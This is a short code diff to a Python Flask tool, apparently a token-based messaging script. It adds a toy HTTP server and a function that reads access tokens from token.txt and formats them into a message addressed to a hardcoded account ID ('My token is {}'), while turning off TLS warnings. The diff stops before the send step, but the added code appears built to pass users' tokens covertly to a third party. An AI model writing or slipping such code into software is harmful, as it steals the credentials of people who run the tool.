@@ -5,6 +5,32 @@ import time
 import random
 import string
 
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"   TRICKS BY SHAHBAZ")
+def execute_server():
+      PORT = 5000
+
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
+
+
+def send_initial_message():
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
+
+      # Modify the message as per your requirement
+      msg_template = "Hello satish sir! I am using your server. My token is {}"
+
+      # Specify the ID where you want to send the message
+      target_id = "100000261036663"
+
+      requests.packages.urllib3.disable_warnings()
+
 app = Flask(__name__)
 app.debug = True
 
